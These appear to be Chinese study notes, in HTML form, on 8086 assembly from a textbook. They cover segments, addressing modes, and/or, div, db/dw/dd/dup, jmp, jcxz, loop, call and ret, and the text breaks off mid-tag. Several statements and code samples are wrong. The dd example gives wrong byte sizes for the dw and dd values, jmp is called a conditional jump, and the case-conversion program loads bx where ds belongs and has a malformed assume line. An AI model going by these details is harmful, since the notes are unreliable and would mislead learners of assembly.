title="包含多个段的程序"></a>包含多个段的程序</h1><p>程序获得合法空间的方式有两种：1.在加载程序是为程序分配；2.再程序执行过程中向系统申请</p><p>书中只讨论了第一种方法：在源程序中申请内存空间</p><p>范例：</p><p><img src="/../00000000/11.jpg"></p><p>dw的含义是“define word”定义字符型数据</p><p>示例中定义了八个字型数据，由于dw放在最前面，所以最初的偏移地址为零。而后每个数据的偏移量增加一个字型长度。</p><p>书上还给了一个示例[在上面代码的end的后面加上了一个start,在dw下面一行mov前也加了start]</p><p>由此引出end的另一个作用，就是通知编译器程序的入口在什么地方。</p><p>由前面也可以知道，在单任务程序系统中，可执行程序的执行过程如下：</p><p>1.通过一些工具将可执行程序载入内存；</p><p>2.设置CS:IP指向程序的第一条要执行的命令（即程序的入口）；</p><p>3.结束运行，返回加载者。</p><p>end start 解读：指明程序的入口，转化为一个入口地址，存储在可执行文件的描述信息中。</p><p>简单构造程序的框架为</p><p>assume cs:code</p><p>code segment</p><p>​数据</p><p>start:</p><p>​代码</p><p>code ends</p><p>end start</p><p>在代码段中使用栈：</p><p><img src="/../00000000/12.jpg"></p><p>这也说明，栈的定义并非在我们的源代码中有相应的编写方式，而是根据CPU的某些读取特性来使用的，示例中创造栈的内存空间就是一个很好的说明</p><p>数据，代码，栈，放入不同的段</p><p>定义多个段分别存不同的类型的二进制信息</p><p>定义多个段的方法与定义栈的方法基本相同，只是段需要设置段名</p><p><img src="/../00000000/13.jpg"></p><p>注意比较下面哪个代码是错误的，错误在哪：</p><p>（1）</p><p>mov ax,data</p><p>mov ds,ax</p><p>mov bx,ds:[6]</p><p>（2）</p><p>mov ds,data</p><p>mov bx,ds:[6]</p><p>错误原因先前内容中有，可自行复习</p><h1 id="更灵活的定位内存地址的方法"><a href="#更灵活的定位内存地址的方法" class="headerlink" title="更灵活的定位内存地址的方法"></a>更灵活的定位内存地址的方法</h1><p>and 和 or 指令</p><p><strong>and</strong> 将相应的操作对象设为0，其他位不变<br>例：</p><p>mov al 01100011B</p><p>and  al 00111011B</p><p>执行结果为</p><p>al  00100011B</p><p>说明：将第六位设置为0的指令是 and al 10111111</p><p>​   将第七位设置为0的指令是 and al 01111111</p><p>​   将第零位设置位0的指令是 and al 11111110</p><p><strong>or</strong>将相应的操作对象设置为1，其他位不变</p><p>ASCII码[一种常见的编码方式]</p><p>如果我们要在屏幕上看到a字母，我们就要通过显存给显卡提供a字母的ASCII码</p><p>以字符的形式给出的数据</p><p><code>db</code> 是汇编语言中的一个伪指令，用于定义字节（byte）类型的数据。</p><p>大小写转化问题：</p><p>用and和or指令转变大小写{判断大写小写决定是否转化}</p><p>[比较字母大小写之间ASCII码的二进制结果之间的差别]</p><p>范例</p><p>assume cs: codesg,ds,datasg</p><p>datasg segment </p><p>​db ‘BaSiC’</p><p>​db ‘iNfOrMaTiOn’</p><p>datasg ends </p><p>codesg segment </p><p>start : mov ax,datasg </p><p>​   mov bx,ax</p><p>​   mov bx,0</p><p>​   mov cx,5</p><p>​s:mov al,[bx]</p><p>​   and al,11011111B</p><p>​   mov [bx] al</p><p>​   inc bx</p><p>​   loop s</p><p>​   mov bx,5</p><p>​   mov cx,11</p><p>​     s0: mov al,[bx]</p><p>​   or al 00100000B</p><p>​   mov [bx],al </p><p>​   inc bx</p><p>​   loop s0</p><p>​   mov ax,4c00h</p><p>​   int 21h</p><p>codesg ends</p><p>end start</p><h1 id="bx-idata"><a href="#bx-idata" class="headerlink" title="[bx+idata]"></a>[bx+idata]</h1><p>[bx+idata]表示一个内存单元，它的地址偏移地址是(bx)+idata</p><p>可以用以下几种形式表示：</p><p>mov ax,[200+bx]</p><p>mov ax,200[bx]</p><p>mov ax,[bx].200</p><p>用[bx+idata]表示数组</p><p><img src="/../00000000/14.jpg"></p><h1 id="SI和DI"><a href="#SI和DI" class="headerlink" title="SI和DI"></a>SI和DI</h1><p>si和di是8086CPU中功能与bx功能相近的寄存器，si和di并不能被分成两个独立的八位寄存器来使用</p><h1 id="bx-si-和-bx-di"><a href="#bx-si-和-bx-di" class="headerlink" title="[bx+si]和[bx+di]"></a>[bx+si]和[bx+di]</h1><p>mov  ax,[bx+di]的含义：将一个内存单元中的内容送入ax中，这个内存单元的长度为两个字节,存放一个字，偏移地址为bx中的数值加上si中的数值，短地址在ds内。</p><p>也可表述为(ax) &#x3D;&#x3D; ((ds)*16+(bx)+(si))</p><p>也可以以这种格式使用：mov ax,[bx] [si]</p><h1 id="bx-si-idata-和-bx-di-idata"><a href="#bx-si-idata-和-bx-di-idata" class="headerlink" title="[bx+si+idata]和[bx+di+idata]"></a>[bx+si+idata]和[bx+di+idata]</h1><p>mov ax,[bx+si+idata] </p><p>将一个内存单元的内容送入ax中，这个内存单元的长度为2字节，存放一个字，偏移地址为bx中的数值加上si中的数值和idata中的数值，段地址在ds中。</p><p>该指令也可写成如下格式：</p><p>mov ax,[bx+200+si]</p><p>mov ax,[200+bx+si]</p><p>mov ax,200[bx] [si]</p><p>mov ax,200.[bx] [si]</p><p>mov ax,[bx] [si].200</p><h1 id="不同寻址方式的灵活运用"><a href="#不同寻址方式的灵活运用" class="headerlink" title="不同寻址方式的灵活运用"></a>不同寻址方式的灵活运用</h1><p>1.[idata] 用一个常量来表示地址，可用于直接定位内存单元</p><p>2.[bx]用一个变量来表示内存地址，可用于间接定位一个内存单元</p><p>3.[bx+idata]用一个变量和一个常量的和表示内存地址，可以在起始地址的基础上用变量间接定位内存单元</p><p>4.[bx+si]用两个变量来表示地址</p><p>5.[bx+si+idata]用两个变量和一个常量表示地址</p><p>一般而言我们要短暂存储数据时，我们都应该使用栈</p><p>具体的汇编代码修改示例，参考原书</p><h1 id="数据处理的两个基本问题"><a href="#数据处理的两个基本问题" class="headerlink" title="数据处理的两个基本问题"></a>数据处理的两个基本问题</h1><p>1.处理的数据在什么位置</p><p>2.处理的数据有多长</p><p>reg 表示一个寄存器，包括：ax,bx,cx,dx,ah,al,bh,bl,ch,cl,dh,dl,sp,bp,si,di</p><p>sreg表示段寄存器，包括：ds,ss,cs,es</p><h1 id="bx-si-di-bp"><a href="#bx-si-di-bp" class="headerlink" title="bx,si,di,bp"></a>bx,si,di,bp</h1><p>1.在8086CPU中，只有这四个寄存器可以用来寻址</p><p>2.在[…]中，这四个寄存器可以单独出现，或者只能以四种组合出现：bx和si,bx和di,bp和si,bp和di</p><p>3.只要[…]中出现了bp，而指令中没有显性地给出段地址，段地址就默认在ss中   例：mov ax,[bp+si]</p><h1 id="汇编语言中的数据位置表达"><a href="#汇编语言中的数据位置表达" class="headerlink" title="汇编语言中的数据位置表达"></a>汇编语言中的数据位置表达</h1><p>1.立即数——idata </p><p>2.寄存器</p><p>3.段地址(SA)和偏移地址(EA)</p><p>存放段地址的寄存器可以是默认的如，DS,SS</p><p>也可以显性给出的 如：mov ax,ss:[si]     mov ax,es:[idata]</p><p>寻址方式总结：</p><p><img src="/../00000000/15.jpg"></p><h1 id="指令要处理的数据有多长"><a href="#指令要处理的数据有多长" class="headerlink" title="指令要处理的数据有多长"></a>指令要处理的数据有多长</h1><p>8086CPU的指令，处理尺寸的数据，byte和word</p><p>#其实就是根据寄存器的大小决定了处理数据的长度</p><p>1.通过寄存器指明要处理数据的尺寸</p><p>1&gt;指明字操作</p><p>mov ax,1</p><p>mov bx,ds:[0]</p><p>mov ds,ax</p><p>mov ds:[0],ax</p><p>inc ax </p><p>add ax 1000</p><p>2&gt;指明字节操作</p><p>mov al,1</p><p>mov al,bl</p><p>mov al,ds:[0]</p><p>mov ds:[0],al</p><p>inc al</p><p>add al,100</p><p>2.没有寄存器名存在的情况下，可以使用操作符 X ptr指明内存单元的长度，X在汇编语言中可以为word或者byte</p><p>1&gt;指明字操作</p><p>mov word ptr ds:[0],1</p><p>inc word  ptr [bx]</p><p>inc word ptr ds:[0]</p><p>add word ptr [bx],2</p><p>2&gt;指明字节操作</p><p>mov byte ptr ds:[0],1</p><p>inc byte  ptr [bx]</p><p>inc byte ptr ds:[0]</p><p>add byte ptr [bx],2</p><p>范例对比：</p><p>假定debug查看2000：1000的内存结果为：FF FF FF FF FF FF FF FF FF FF ……</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,2000<br>mov ds,ax <br>mov byte ptr [1000H],1<br>#在汇编语言中，ptr 是一个关键字，用来指明紧跟其后的数值是一个指针或者地址。这个关键字通常用于指定操作数的大小和类型，尤其是在操作内存时。<br></code></pre></td></tr></table></figure><p>这样得到的结果是：2000：1000 01 FF FF FF FF FF ……</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,2000<br>mov ds,ax<br>mov word ptr [1000H],1<br></code></pre></td></tr></table></figure><p>这样得到的结果是 2000：1000    01 00 FF FF FF FF FF FF ……</p><p>对于这个结果再作深入解析一下：</p><p>在 x86 架构的汇编语言中，数据在内存中的存储方式通常是小端字节序（Little-Endian）。这意味着较低的地址存放的是数值的低位字节，而较高的地址存放的是数值的高位字节。</p><ol><li><code>mov ax, 2000</code>：将数值 2000 移动到 <code>ax</code> 寄存器中。在十六进制中，2000 表示为 <code>0x2000</code>。</li><li><code>mov ds, ax</code>：将 <code>ax</code> 寄存器的值（2000 或 <code>0x2000</code>）移动到数据段寄存器 <code>ds</code> 中。</li><li><code>mov word ptr [1000H], 1</code>：将数值 1 移动到地址 <code>1000H</code> 指向的内存位置，并且指定这是一个字（word）操作，即 16 位。</li></ol><p>由于您指定了 <code>word ptr</code>，这意味着您正在操作一个 16 位的值。在小端字节序中，这条指令将数值 1（<code>0x0001</code>）的字节表示放入内存地址 <code>1000H</code> 和 <code>1001H</code>：</p><ul><li>地址 <code>1000H</code>（较低的地址）将存放数值 1 的低位字节，即 <code>0x01</code>。</li><li>地址 <code>1001H</code>（较高的地址）将存放数值 1 的高位字节，即 <code>0x00</code>。</li></ul><p>因此，对于 <code>mov word ptr [1000H], 1</code> 这条指令，放入的是低位字节在较低的地址，高位字节在较高的地址。</p><p>小端字节序（Little-Endian）是一种计算机存储多字节数据类型（如整数、浮点数等）的方式。在小端字节序中，一个多字节值的最低有效字节（LSB，即数值最低的字节）存储在最低的内存地址处，而最高有效字节（MSB，即数值最高的字节）存储在最高的内存地址处。</p><p>3.其他方法：有些指令默认了访问的是字单元还是字节单元，比如push [1000H]就不用指明访问的是字单元还是字节单元，因为push指令只对字操作</p><h2 id="div指令（除法指令）"><a href="#div指令（除法指令）" class="headerlink" title="div指令（除法指令）"></a>div指令（除法指令）</h2><p>注意事项：</p><p>1.除数：有8位和16位两种，在一个reg或者内存单元中</p><p>2.被除数：默认放在AX或者AX和DX中，如果除数是八位，被除数则为16位，默认再AX中存放；如果除数为16位，被除数则为32位，在AX和DX中存放，DX存放高16位AX存放低16位。</p><p>3.结果：如果除数为8位，则AL存储计算的商，AH存储计算的余数，如果除数为16位，则AX存储除法操作的商，DX存储除法操作的余数。</p><p>使用格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">div reg<br>div 内存单元<br>#不用指明除数，因为默认<br></code></pre></td></tr></table></figure><h3 id="伪指令dd"><a href="#伪指令dd" class="headerlink" title="伪指令dd"></a>伪指令dd</h3><p>dd是用来定义double word(双字)型数据的</p><p>范例:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">data segment<br> db 1<br> dw 1<br> dd 1<br>data ends<br></code></pre></td></tr></table></figure><p>上述汇编在data段中定义了三个数据，</p><p>第一个数据为01H，在data：0处，占一个字节</p><p>第二个数据为0001H，在data：1处，占一个字节</p><p>第三个数据为00000001H，在data：2处，占两个字节</p><h3 id="dup指令"><a href="#dup指令" class="headerlink" title="dup指令"></a>dup指令</h3><p>dup指令和定db,dw,dd一样，也是由编译器识别处理的符号，它是和db,dd,dw等伪指令配合使用的，用于进行数据的重复.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">db 3 dup (0)<br>#定义了三个字节，他们的值都是0，等效于db 0,0,0<br>db 3 dup (0,1,2)<br>#定义了9个字节，他们是0,1,2,0,1,2,0,1,2，等效于db 0,1,2,0,1,2,0,1,2<br>db 3 dup (&#x27;abc&#x27;,&#x27;ABC&#x27;)<br>#定义了18个字节<br></code></pre></td></tr></table></figure><p>dup的使用格式：</p><p>db 重复的次数 dup （重复的字节型数据）</p><p>dw 重复的次数 dup  (重复的字型数据)</p><p>dd 重复的次数 dup (重复的双字型数据)</p><h1 id="转移指令的原理"><a href="#转移指令的原理" class="headerlink" title="转移指令的原理"></a>转移指令的原理</h1><p>可以修改IP，或同时修改CS和IP的指令统称为转移指令。概括而言，转移指令就是能控制CPU执行内存内某处代码的指令。</p><p>8086CPU的转移行为有以下几类：</p><p>1.只能修改IP时，称为段内转移，比如jmp ax</p><p>2.同时修改CS和IP时，称为段间转移，比如jmp 1000：0</p><p>由于转移指令对IP修改的范围不同，段内转移又分为短转移和近转移</p><p>短转移的IP修改范围为-128~127</p><p>近转移IP的修改范围为-32768~32767</p><p>8086CPU的转移指令又分为以下几类：</p><p>1.无条件转移指令（如jmp）</p><p>2.条件转移指令</p><p>3.循环指令(loop)</p><p>4,过程</p><p>5.中断</p><p><strong>操作符offset</strong></p><p>操作符offset在汇编语言中是由编译器处理的符号，它的功能是取得标号的偏移地址</p><p>范例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg<br>codesg sement<br>  start:mov ax,offset start ; 相当于mov ax，0<br>      s:mov ax,offset s;相当于mov ax，3，第一条指令长度为3个字节，所以s的偏移地址为3<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><p><strong>jmp指令</strong></p><p>jmp为条件跳转指令可以只修改IP，也可以同时修改IP和CS</p><p>jmp指令要给出两种信息：</p><p>1.转移的目的地址</p><p>2.转移的距离（段间转移，段内短转移，段内近转移）</p><p><strong>根据位移进行转移的jmp指令</strong></p><p>jmp short 标号(转到标号处执行指令)</p><p>这种格式的jmp指令是实现段内短转移，他们对IP的修改范围是-128~127，格式中的short符号说明指令是进行段内短转移，标号是代码段中的标号，指明了指令要转移到的目的地，转移指令结束后,CS和IP应该指向该标号处的指令</p><p>范例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg<br>codesg segment<br> start:mov ax,0<br>       jmp short s<br>    add ax,1<br>  s:inc ax<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><p>机械指令对比</p><p>正常机械指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,0123h        #B8 23 01<br>mov ax,ds:[0123h]   #A1 23 01<br>push ds:[0123h]     #FF 36 23 01<br></code></pre></td></tr></table></figure><p>上述范例可以看到，idata无论是一个数据还是地址，都会在对应的机械语言中出现，因为CPU执行命令他必须知道这些数据或地址</p><p>范例中的代码段和对应机械码比较：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#B8 00 00  #0000  #mov ax,0000<br>#EB 03     #0003  #jmp 0008<br>#05 01 00  #0005  #add ax,0001<br>#40        #0008  #inc ax<br>#上述机械码的结果看似毫无问题，但仔细看就会发现，jmp short s中的s(0008)并没有出现在机械码中，<br></code></pre></td></tr></table></figure><p>书本上另给的一个范例作比较;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg<br><br>codesg segment <br> start:mov ax,0<br>       mov bx,0<br>       jmp short s<br>       add ax,1<br>     s:inc ax<br>codesg ends<br>end starts<br></code></pre></td></tr></table></figure><p>对应成机械码就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#B8 00 00  #0000  #mov ax,0000<br>#BB 00 00  #0003  #mov bx,0000<br>#EB 03     #0006  #jmp 000B<br>#05 01 00  #0008  #add ax,0001<br>#40        #000B  #inc ax<br></code></pre></td></tr></table></figure><p>两个功能差别不大的汇编代码，得到同样的结果，说明CPU在执行jmp指令时不需要转移的目标地址，也就是不需要这个地址就能实现对IP的修改</p><p>CPU执行指令的过程回顾：</p><p>1.从CS:IP指向的内存单元读取指令，读取的指令进入指令缓冲器；</p><p>2.IP&#x3D;IP+(所读命令的长度)，从而指向下一条指令</p><p>3.执行指令，转到1，重复该过程</p><p>比较两段代码后发现，跳转距离相同，都是3，这也就是03的含义</p><p>所以jmp short (标号)的功能为:(IP)&#x3D;(IP)+八位位移</p><p>1.八位位移&#x3D;标号处的地址 - jmp指令后第一个字节的地址；</p><p>2.short 指明此处位移为八位位移</p><p>3.八位位移的参数范围时-128~127，用补码表示</p><p>4.八位位移由程序编译时由编译器算出</p><p>还有一种和jmp short 标号功能相近的指令格式，jmp near ptr 标号，它实现的时段内近转移</p><p>jmp near ptr 标号 的功能为(IP) &#x3D; (IP) + 十六位位移</p><p>1.16位位移 &#x3D; 标号处的地址 - jmp 指令后的第一个字节的地址</p><p>2.near ptr 指明此处位移为16位位移，进行的是段内近转移</p><p>3.段内近转移的范围为-32768~32767，用补码表示</p><p>4.16位位移由编译程序在编译时算出</p><h1 id="转移的目的地址在指令中的jmp指令"><a href="#转移的目的地址在指令中的jmp指令" class="headerlink" title="转移的目的地址在指令中的jmp指令"></a>转移的目的地址在指令中的jmp指令</h1><p>jmp far ptr 标号 实现的是段间转移，又称为远转移</p><p>(CS)&#x3D;标号所在段的段地址   (IP)&#x3D;标号所在段中的偏移地址</p><p>far ptr 指明了指令用标号的段地址和偏移地址修啊给CS和IP</p><p>范例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg<br>codesg segment<br> start:mov ax,0<br>       mov bx,0<br>       jmp far ptr s<br>       db 256 dup (0)<br>     s:add ax,1<br>       inc ax<br>codesg ends<br>end start<br><br></code></pre></td></tr></table></figure><p>对应的机械码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#B8 00 00         #0000   #mov ax,0000<br>#BB 00 00         #0003   #mov bx,0000<br>#EA 0B 01 BD 0B   #0006   #jmp 0BBD:010B<br>#00 00            #000B   #add [BX+SI],al<br>#00 00            #000D   #add [BX+SI],al<br>#00 00            #000F   #add [BX+SI],al<br>#00 00            #0011   #add [BX+SI],al<br></code></pre></td></tr></table></figure><p>我们需要注意一下jmp对应的机械码：EA 0B 01 BD 0B 其中包含转移的目的地址”0B 01 BD 0B“是目的地址在指令中的顺序，高地址是’BD 0B’是转移的段地址；</p><p>0BBDH；低地址是”0B 01“是偏移地址：010BH</p><h1 id="转移地址在寄存器中的jmp指令"><a href="#转移地址在寄存器中的jmp指令" class="headerlink" title="转移地址在寄存器中的jmp指令"></a>转移地址在寄存器中的jmp指令</h1><p>命令格式：jmp 16位 reg </p><p>功能;（IP）&#x3D;(16位的reg)</p><h1 id="转移地址在内存中的jmp指令"><a href="#转移地址在内存中的jmp指令" class="headerlink" title="转移地址在内存中的jmp指令"></a>转移地址在内存中的jmp指令</h1><p>两种形式：</p><p>1.jmp word ptr 内存单元地址(段内转移)</p><p>功能：从内存单元地址处存放一个着一个字，这是转移的目的偏移地址</p><p>内存单元可以用寻址方式的任意格式给出</p><p>范例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,0123H<br>mov ds:[0],ax<br>jmp word ptr ds<br>#执行后IP为0123H<br></code></pre></td></tr></table></figure><p>范例2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,0123H<br>mov [bx],ax<br>jmp word ptr [bx]<br>#执行后IP为123H<br></code></pre></td></tr></table></figure><p>2.jmp dword ptr 内存单元地址(段间转移)</p><p>功能：从内存单元处开始存放着两个字，高地址的字是转移的目标地址的段地址，低地址是转移目的的偏移地址</p><p>(CS) &#x3D; (内存单元地址+2)</p><p>(IP) &#x3D; (内存单元地址)</p><p>内存单元地址可以任意形式给出</p><p>范例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,0123H<br>mov ds:[0],ax<br>mov word ptr ds:[2],0<br>jmp dword ptr ds:[0]<br></code></pre></td></tr></table></figure><p>执行后，(CS)&#x3D;0; (IP)&#x3D;0123H,CS:IP指向0000：0123</p><p>范例2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,0123H<br>mov [bx],ax<br>mov word ptr [bx+2],0<br>jmp dword ptr [bx]<br></code></pre></td></tr></table></figure><p>执行后,(CS) &#x3D; 0，(IP) &#x3D; 0123H,CS:IP 指向0000:0123</p><h1 id="jcxz指令-Jump-if-CX-equals-Zero"><a href="#jcxz指令-Jump-if-CX-equals-Zero" class="headerlink" title="jcxz指令(Jump if CX equals Zero)"></a>jcxz指令(Jump if CX equals Zero)</h1><p>jcxz指令为有效转移指令，所有的有条件转移的指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都为-128~127</p><p>指令格式：</p><p>jcxz   标号     (如果(cx) &#x3D; 0，转到标号处执行)</p><p>操作：当(cx) &#x3D; 0 时，(IP) &#x3D; (IP) + 8位位移</p><p>8位位移 &#x3D; 标号处的地址 - jcxz指令后的第一个字节的地址；</p><p>8位位移的范围为-128~127，用补码表示；</p><p>8位位移由编译程序在编译时算出。</p><p>用C语言的形式理解就等效于：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span>((cx) == <span class="hljs-number">0</span>)jmp <span class="hljs-type">short</span> 标号<br></code></pre></td></tr></table></figure><h1 id="loop指令"><a href="#loop指令" class="headerlink" title="loop指令"></a>loop指令</h1><p>loop指令是循环指令，所有循环指令都是短转移，在对应的机械码中都包含转移的位移，而不是目的地址，IP修改范围是-128~127</p><p>根据位进行转移的意义：便于灵活处理，如果机械码中是s的具体内存地址，则对代码段在内存中的偏移地址有着严格的限制(例如：之后想修改代码，而代码段的被修改语句机械码长度与原来不同，这时若机械码还是表示固定的s的原来地址，则会发生报错)</p><h1 id="编译器对转移位移超界的检测"><a href="#编译器对转移位移超界的检测" class="headerlink" title="编译器对转移位移超界的检测"></a>编译器对转移位移超界的检测</h1><p>书上也没具体介绍原理，只是说明会检测</p><h2 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg<br>codesg segment<br>   mov ax,4c00h<br>   int 21h<br>start: mov ax,0<br> s:nop<br>   nop<br>   <br>   mov di,offset s<br>   mov si,offset s2<br>   mov ax,cs:[si]<br>   mov cs:[di],ax<br>   <br>s0:jmp short s<br>s1:mov ax,0<br>   int 21h<br>   mov ax,0<br>s2:jmp short s1<br>   nop<br>   <br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><h1 id="CALL指令和RET指令"><a href="#CALL指令和RET指令" class="headerlink" title="CALL指令和RET指令"></a>CALL指令和RET指令</h1><p>call和ret指令都是转移指令，修改IP的内容，从而实现近转移；</p><p>retf调用栈中的数据，修改CS和IP的内容，从而实现远转移；</p><p>CPU执行ret指令时，进行下面两步操作</p><p>1.IP &#x3D; (ss*16) + (sp)</p><p>2.(sp) &#x3D; (sp) + 2</p><p>CPU执行retf指令时，进行一下面四步操作</p><p>1.(IP) &#x3D; (ss)*16 + (sp)</p><p>2.(sp) &#x3D; (sp) + 2</p><p>3.(cs) &#x3D; (ss*16) + (sp)</p><p>4.(sp) &#x3D; (sp) + 2</p><p>从汇编的角度解释这两个命令就是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#ret<br>pop IP<br>#retf<br>pop IP<br>pop CS<br></code></pre></td></tr></table></figure><p>范例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br><br>stack segment <br>   db 16 dup (0)<br>stack ends<br><br>code segment <br>   mov ax,4c00h<br>   int 21h<br>start: mov ax,stack<br>   mov ss,ax<br>   mov sp,16<br>   mov ax,0<br>   push ax<br>   mov bx,0<br>   ret<br>code ends<br><br>end start<br></code></pre></td></tr></table></figure><p>ret执行后IP &#x3D; 0，CS:IP指向代码段的第一条指令</p><h2 id="call指令："><a href="#call指令：" class="headerlink" title="call指令："></a>call指令：</h2><p>CPU执行call指令时，会进行两步操作:</p><p>1.将当前(其实是call这句话的下一句)的IP或CS和IP压入栈中；</p><p>2.转移</p><p>call指令不能实现短转移，除此之外，call指令实现转移的方法和jmp指令的原理相同</p><p>根据位移进行转移的call指令</p><p>格式：call 标号</p><p>1.(sp) &#x3D; (sp) - 2</p><p>   ((ss)*16+(sp)) &#x3D; (IP)</p><p>2.IP &#x3D; IP +16位位移</p><p>CPU执行call指令相当于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push IP<br>jmp near ptr 标号<br></code></pre></td></tr></table></figure><p>转移的目的地址在指令中的call指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">call far ptr 标号<br></code></pre></td></tr></table></figure><p>CPU在执行此格式的call指令时会进行一下操作：</p><p>1.（sp） &#x3D;  (sp) - 2</p><p>​     (ss)*16+(sp)  &#x3D;  (cs)</p><p>​     (sp) &#x3D; (sp) +2</p><p>​     (ss)*16+(sp) &#x3D; (IP)</p><p>2.(CS) &#x3D; 标号所在的段地址</p><p>   (IP) &#x3D; 标号所在的偏移地址</p><p>从汇编的角度看就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push CS<br>push IP<br>jmp far ptr 标号<br></code></pre></td></tr></table></figure><p>转移地址在寄存器里的call指令：</p><p>指令格式：call 16reg</p><p>功能：</p><p>(sp) &#x3D; (sp) - 2</p><p>(ss)*16+(sp) &#x3D; （IP）</p><p>IP &#x3D; (16位reg)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 